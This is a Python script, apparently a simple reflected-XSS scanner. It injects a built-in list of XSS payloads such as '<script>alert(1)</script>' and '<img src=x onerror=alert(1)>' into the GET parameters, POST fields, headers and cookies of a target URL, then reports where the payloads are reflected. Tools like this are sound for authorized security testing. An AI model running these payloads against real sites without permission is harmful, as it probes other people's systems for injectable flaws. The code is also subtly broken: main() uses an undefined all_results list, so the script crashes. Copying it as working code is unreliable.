import argparse
import csv
import html
import sys
import time
import re
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import requests
from bs4 import BeautifulSoup

DEFAULT_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "';alert(1);//",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
]

USER_AGENT = "xss-tester/1.0"

def get_baseline(url, method='GET', data=None, headers=None, cookies=None):
    headers = headers or {}
    headers.setdefault("User-Agent", USER_AGENT)
    if method.upper() == 'GET':
        r = requests.get(url, headers=headers, cookies=cookies, timeout=15)
    else:
        r = requests.post(url, data=data, headers=headers, cookies=cookies, timeout=15)
    return r.status_code, r.text

def inject_into_url(url, param, payload):
    p = urlparse(url)
    qs = dict(parse_qsl(p.query, keep_blank_values=True))
    qs[param] = payload
    new_q = urlencode(qs, doseq=True)
    new_url = urlunparse((p.scheme, p.netloc, p.path, p.params, new_q, p.fragment))
    return new_url

def replace_in_data(data, param, payload):
    d = data.copy()
    d[param] = payload
    return d

def find_reflection(baseline_text, test_text, payload):
    if payload in test_text:
        context_snippet = extract_context(test_text, payload)
        return {'type':'raw', 'snippet':context_snippet}
    escaped = html.escape(payload)
    if escaped in test_text:
        return {'type':'encoded', 'snippet': extract_context(test_text, escaped)}
    pattern = re.sub(r'(<|>|/|")', lambda m: "(?:%s|%s)" % (re.escape(m.group(0)), html.escape(m.group(0))), re.escape(payload))
    if re.search(pattern, test_text, re.IGNORECASE):
        return {'type':'partial', 'snippet': extract_context(test_text, payload[:50])}
    return None

def extract_context(text, needle, width=80):
    idx = text.find(needle)
    if idx == -1:
        return ""
    start = max(0, idx-width)
    end = min(len(text), idx+len(needle)+width)
    return text[start:end].replace("\n"," ")

def scan_get(url, params_to_test, payloads, headers=None, cookies=None, rate=0.2):
    baseline_status, baseline_text = get_baseline(url, method='GET', headers=headers, cookies=cookies)
    results = []
    for param in params_to_test:
        for p in payloads:
            test_url = inject_into_url(url, param, p)
            try:
                r = requests.get(test_url, headers=headers or {}, cookies=cookies or {}, timeout=15)
            except Exception as e:
                print(f"[!] Request failed for {test_url}: {e}")
                continue
            info = find_reflection(baseline_text, r.text, p)
            if info:
                results.append({
                    'vector':'GET param',
                    'param':param,
                    'payload':p,
                    'type':info['type'],
                    'status_code': r.status_code,
                    'snippet': info['snippet'],
                    'tested_url': test_url
                })
            time.sleep(rate)
    return results

def scan_post(url, post_keys, payloads, headers=None, cookies=None, rate=0.2):
    baseline_status, baseline_text = get_baseline(url, method='POST', data={}, headers=headers, cookies=cookies)
    results = []
    for key in post_keys:
        for p in payloads:
            data = {k: "" for k in post_keys}
            data[key] = p
            try:
                r = requests.post(url, data=data, headers=headers or {}, cookies=cookies or {}, timeout=15)
            except Exception as e:
                print(f"[!] Request failed for POST {url} with {key}: {e}")
                continue
            info = find_reflection(baseline_text, r.text, p)
            if info:
                results.append({
                    'vector':'POST param',
                    'param':key,
                    'payload':p,
                    'type':info['type'],
                    'status_code': r.status_code,
                    'snippet': info['snippet'],
                    'tested_url': url
                })
            time.sleep(rate)
    return results

def scan_headers_and_cookies(url, header_keys, cookie_keys, payloads, headers=None, cookies=None, rate=0.2):
    baseline_status, baseline_text = get_baseline(url, method='GET', headers=headers, cookies=cookies)
    results = []
    for key in header_keys:
        for p in payloads:
            h = dict(headers or {})
            h[key] = p
            try:
                r = requests.get(url, headers=h, cookies=cookies or {}, timeout=15)
            except Exception as e:
                print(f"[!] Request failed for header {key}: {e}")
                continue
            info = find_reflection(baseline_text, r.text, p)
            if info:
                results.append({
                    'vector':'HEADER',
                    'param':key,
                    'payload':p,
                    'type':info['type'],
                    'status_code': r.status_code,
                    'snippet': info['snippet'],
                })
            time.sleep(rate)
    for key in cookie_keys:
        for p in payloads:
            c = dict(cookies or {})
            c[key] = p
            try:
                r = requests.get(url, headers=headers or {}, cookies=c, timeout=15)
            except Exception as e:
                print(f"[!] Request failed for cookie {key}: {e}")
                continue
            info = find_reflection(baseline_text, r.text, p)
            if info:
                results.append({
                    'vector':'COOKIE',
                    'param':key,
                    'payload':p,
                    'type':info['type'],
                    'status_code': r.status_code,
                    'snippet': info['snippet'],
                })
            time.sleep(rate)
    return results

def save_results_csv(results, filename="xss_results.csv"):
    if not results:
        print("No results to save.")
        return
    keys = results[0].keys()
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=keys)
        writer.writeheader()
        for r in results:
            writer.writerow(r)
    print(f"[+] Results saved to {filename}")

def parse_args():
    parser = argparse.ArgumentParser(description="Simple XSS reflection tester")
    parser.add_argument('url', help="Target URL (use full URL, e.g. http://localhost/page.php)")
    parser.add_argument('--get-params', nargs='*', default=['q','search','id','name'], help="GET parameter names to test")
    parser.add_argument('--post-params', nargs='*', default=['username','email','comment','message'], help="POST form keys to test")
    parser.add_argument('--headers', nargs='*', default=['User-Agent','Referer','X-Forwarded-For'], help="Header names to test")
    parser.add_argument('--cookies', nargs='*', default=['session','theme','username'], help="Cookie names to test")
    parser.add_argument('--payloads-file', help="File with payloads (one per line). If omitted, uses default payloads")
    parser.add_argument('--rate', type=float, default=0.2, help="Delay between requests in seconds (be polite)")
    return parser.parse_args()

def main():
    args = parse_args()
    payloads = DEFAULT_PAYLOADS[:]
    if args.payloads_file:
        with open(args.payloads_file, 'r', encoding='utf-8') as pf:
            payloads = [line.strip() for line in pf if line.strip()]
    headers = {'User-Agent': USER_AGENT}
    print("[*] Building baseline and starting scans...")
    print("[*] Scanning GET params:", args.get_params)
    all_results.extend(scan_get(args.url, args.get_params, payloads, headers=headers, cookies={} , rate=args.rate))
    print("[*] Scanning POST params:", args.post_params)
    all_results.extend(scan_post(args.url, args.post_params, payloads, headers=headers, cookies={}, rate=args.rate))
    print("[*] Scanning headers:", args.headers, "and cookies:", args.cookies)
    all_results.extend(scan_headers_and_cookies(args.url, args.headers, args.cookies, payloads, headers={'User-Agent':USER_AGENT}, cookies={}, rate=args.rate))
    if all_results:
        print("[!] Potential reflections found:")
        for r in all_results:
            print(f" - {r['vector']} {r['param']} -> {r['type']} (payload={r['payload']})")
            print("   snippet:", r.get('snippet','')[:160])
    else:
        print("[+] No obvious reflections found using simple heuristics.")
    save_results_csv(all_results)

if __name__ == '__main__':
    main()
